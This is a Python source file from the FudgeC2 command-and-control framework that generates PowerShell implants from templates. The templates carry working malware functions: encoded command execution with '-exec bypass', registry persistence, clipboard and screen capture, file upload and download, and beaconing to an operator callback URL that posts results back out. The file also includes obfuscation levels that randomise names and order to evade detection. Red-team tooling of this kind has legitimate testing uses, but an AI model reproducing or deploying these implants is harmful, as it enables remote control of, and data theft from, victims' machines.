import jinja2
import string
import random
import base64

from Implant.PSObfucate import PSObfucate
from Implant.ImplantFunctionality import ImplantFunctionality
from NetworkProfiles.NetworkProfileManager import NetworkProfileManager


class ImplantGenerator:
    # ImplantGenerator has a single public method (generate_implant_from_template)
    #   which is used to generate a new active implant in the event of a stager
    #   calling back. Configuration from the implant template is used to determine
    #   which functionality should be embedded within the active implant.

    ImpFunc = ImplantFunctionality()
    NetProfMan = NetworkProfileManager()

    JinjaRandomisedArgs = {
        "obf_remote_play_audio": "RemotePlayAudio",
        "obf_sleep": "sleep",
        "obf_select_protocol": "select_protocol",
        "obf_collect_sysinfo": "collect-sysinfo",
        "obf_http_conn": "http-connection",
        "obf_https_conn": "https-connection",
        "obf_dns_conn": "dns-connection",
        "obf_create_persistence": "create-persistence",
        "obf_builtin_command": "execute-command",
        "obf_reg_key_name": "FudgeC2Persistence",
        "obf_callback_url": "url",
        "obf_callback_reason": "callback_reason",
        "obf_get_clipboard": "export-clipboard",
        "obf_load_module": "load-ext-module",
        "obf_invoke_module": "invoke-module",
        "obf_get_loaded_modules": "get-loaded-modules",
        "obf_upload_file": "upload-file",
        "obf_download_file": "download-file",
        "obf_screen_capture": "screen-capture",
        "obf_kill_date": "implant_kill_date"
        }

    execute_command = '''
function {{ ron.obf_builtin_command }}($data){
    $a = $data.Substring(0,2)
    $global:command_id = $data.Substring(2,24)
    if ($data.Substring(26).length -gt 1){
        $b = [System.Convert]::FromBase64String($data.Substring(26))
    }
    if($a -eq "CM"){
        $c = [System.Convert]::ToBase64String([system.Text.Encoding]::Unicode.getbytes([System.Text.Encoding]::UTF8.GetString($b)))
        $global:tr = powershell.exe -exec bypass -EncodedCommand $c
    } elseif($a -eq "SI"){
        {{ ron.obf_collect_sysinfo }}
    } elseif ($a -eq "EP"){
        {{ ron.obf_create_persistence }}
    } elseif ($a -eq "PS"){
        {{ ron.obf_remote_play_audio }}($b)
    } elseif ($a -eq "EC"){ 
        {{ ron.obf_get_clipboard }} 
    } elseif ($a -eq "LM"){
        {{ ron.obf_load_module }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "IM"){
        {{ ron.obf_invoke_module }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "ML"){
        {{ ron.obf_get_loaded_modules }}  
    } elseif ($a -eq "FD"){
        {{ ron.obf_download_file }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "UF"){
        {{ ron.obf_upload_file }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "SC"){
        {{ ron.obf_screen_capture }}([System.Text.Encoding]::UTF8.GetString($b))
    } else {
        $global:tr = $null
    }
}
'''
# TO BE REMOVED
    http_function = '''
function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
    if ( ${{ ron.obf_callback_reason }} -eq $null ){
        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/index"
        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing
        $global:headers = $r.Content
    } else {
        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/help"
        $enc = [system.Text.Encoding]::UTF8
        $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
        $data2 = $global:command_id+$data2
        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
        $global:headers = $r.Content
    }
}
'''

    https_function = '''
function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
    if ( ${{ ron.obf_callback_reason }} -eq $null ){
        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/index"
        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing
        $global:headers = $r.Content
    } else {
        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/help"
        $enc = [system.Text.Encoding]::UTF8
        $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
        $data2 = $global:command_id+$data2
        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
        $global:headers = $r.Content
    }
}
'''

    kill_date = ''' 
function {{ ron.obf_kill_date }}{
    $kd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{{ kill_date_encoded }}"))
    $pdt = [datetime]::parseexact($kd, 'yyyy-MM-dd HH:mm:ss', $null)
    if ((Get-Date) -gt ($pdt)){
        [string]::join('',[ChaR[]](101, 120, 105, 116)) |& ((gv ‘*MDr*’).NamE[3,11,2] -join '')
    }  
}
'''

    select_protocol = '''
function {{ ron.obf_select_protocol }}($b){
    {% if kill_date %}{{ ron.obf_kill_date }}{% endif %}
    sleep (Get-Random -Minimum (${{ ron.obf_sleep }} *0.90) -Maximum (${{ ron.obf_sleep }} *1.10))
    return get-random($b)
}
'''

    implant_main = '''
{{ obf_variables }}
{% if obfuscation_level == 0 %}
# Implant generated by:
# https://github.com/Ziconius/FudgeC2
{% endif %}
$global:command_id = 0
start-sleep({{ initial_sleep }})
${{ ron.obf_sleep }}={{ beacon }}
${{ ron.obf_callback_url }} = "{{ url }}"
while($true){
    $plh=$null
    $global:headers = $null
    try {
            {{ proto_core }}
    } catch {
        $_.Exception | Out-Null
    }
    if (($global:headers -NotLike "==") -And ($global:headers -ne $null)){
        {{ ron.obf_builtin_command }}($global:headers)
        if ($global:tr -ne $null){ 
            $atr = $global:tr -join "`n"
            $plh = $atr
            try {
                    {{ proto_core }}
            } catch {
                $_.Exception | Out-Null
            }
        }       
    }
}
'''

    def _manage_implant_function_order(self, implant_info, function_list):
        # -- This is responsible for randomising the function order within the generated implant.
        if implant_info['obfuscation_level'] >= 1:
            random.shuffle(function_list)
        constructed_base_implant = ""
        for implant_function in function_list:
            constructed_base_implant = constructed_base_implant + implant_function.rstrip()
        constructed_base_implant = constructed_base_implant + self.implant_main
        return constructed_base_implant.lstrip()

    def _function_name_obfuscation(self, implant_info, function_names):
        if implant_info['obfuscation_level'] >= 2:
            for key in function_names.keys():
                letters = string.ascii_lowercase
                temp_string = ''.join(random.choice(letters) for i in range(8))
                if temp_string not in function_names.values():
                    function_names[key] = temp_string
        return function_names

    def _process_modules(self, implant_data, randomised_function_names):
        # Add default functions to added to the implant which will be randomised.
        core_implant_functions = [
            self.execute_command,
            self.select_protocol
            ]

        implant_functions = self.ImpFunc.get_list_of_implant_text()
        implant_functions.extend(core_implant_functions)



        ports = {}
        network_profile_functions = {}
        # -- NEW NETWORK PROFILE CONTENT
        for x in implant_data['network_profiles']:
            #print("@@",x)
            code, variables= self.NetProfMan.get_implant_powershell_code(x)

            obf_variables = variables[0]
            port_variables = variables[1]

            # code is now in the base
            implant_functions.append(code)
            # Args are now in the base!
            self.JinjaRandomisedArgs.update(obf_variables)
            print(self.JinjaRandomisedArgs)
            network_profile_functions.update(obf_variables)



            for key in port_variables.keys():
                port_variables[key] = implant_data['network_profiles'][x]
            print(port_variables) #  =implant_data['network_profiles'][x]
            print("@@",port_variables, implant_data['network_profiles'][x])
            print("-----------------------------------------")
            ports.update(port_variables)


        print(f"final ports: {ports}")
        # Checks which protocols should be embedded into the implant.
        # if implant_data['comms_http'] is not None:
        #     implant_functions.append(self.http_function)
        # if implant_data['comms_https'] is not None:
        #     implant_functions.append(self.https_function)
        if implant_data['kill_date'] is not None:
            implant_functions.append(self.kill_date)

        # TODO: These protocols will be delivered in later version of FudgeC2
        # if id['comms_dns'] != None:
        #     implant_functions.append(self.https_function)
        # if id['comms_binary'] != None:
        #     implant_functions.append(self.https_function)

        constructed_implant = self._manage_implant_function_order(implant_data, implant_functions)


        # DEV
        protocol_string = ""
        proto_count = 0
        for net_prof in network_profile_functions.keys():
            print(net_prof)
            print(network_profile_functions[net_prof])
            protocol_string += f"     {proto_count} {{ {network_profile_functions[net_prof]}($plh) }}\n"
            proto_count += 1


        f_str = 'switch (' + randomised_function_names['obf_select_protocol'] + '(' + str(
            proto_count) + ') ){ \n' + protocol_string + ' }'
        print(f_str)

        # Generates the blob of code which will be used to determine which protocol should be selected from.
        # protocol_string = ""
        # proto_count = 0
        # proto_list = {'comms_http': randomised_function_names['obf_http_conn'],
        #               'comms_https': randomised_function_names['obf_https_conn'],
        #               'comms_dns': randomised_function_names['obf_dns_conn']}
        #
        # for x in proto_list.keys():
        #     if implant_data[x] is not 0:
        #         protocol_string = protocol_string + "    " + str(proto_count) + " { " + proto_list[x] + "($plh) }\n"
        #         proto_count += 1
        #
        # f_str = 'switch ('+randomised_function_names['obf_select_protocol']+'('+str(proto_count)+') ){ \n'+protocol_string+' }'
        return constructed_implant, f_str, ports

    def generate_implant_from_template(self, implant_data):
        """
        generate_implant_from_template
         - Takes the generated implant info (Generated implants (by UIK)

        _process_modules
         - This controls which protocols and additional modules are embedded into the implant.
         - Generates the main function multi proto selection
        """
        implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
        implant_template, protocol_switch, ports = self._process_modules(implant_data, implant_function_names)

        callback_url = implant_data['callback_url']
        variable_list = ""
        if implant_data['obfuscation_level'] >= 3:
            ps_ofb = PSObfucate()
            variable_list, callback_url = ps_ofb.variableObs(implant_data['callback_url'])
        cc = jinja2.Template(implant_template)
        print(implant_data['kill_date'])
        output_from_parsed_template = cc.render(
            initial_sleep=implant_data['initial_delay'],
            http=12345,
            url=callback_url,
            # Temp
            http_port=1234,
            https_port=3456,
            dns_port=6789,
            ports=ports,
            # netprof=netprof,
            # end temp
            uii=implant_data['unique_implant_id'],
            stager_key=implant_data['stager_key'],
            ron=implant_function_names,
            beacon=implant_data['beacon'],
            proto_core=protocol_switch,
            obfuscation_level=implant_data['obfuscation_level'],
            obf_variables=variable_list,
            kill_date=implant_data['kill_date'],
            kill_date_encoded=base64.b64encode(str(implant_data['kill_date']).encode()).decode()
        )

        # Wrapping implant in function to allow Powershell scope to expose the implant code to itself
        f_name = f"{random.choice(string.ascii_lowercase)}_{random.choice(string.ascii_lowercase)}"
        # 'h; is an alias for history....
        finalised_implant = f"function {f_name}{{ {output_from_parsed_template} }};{f_name}"
        return finalised_implant
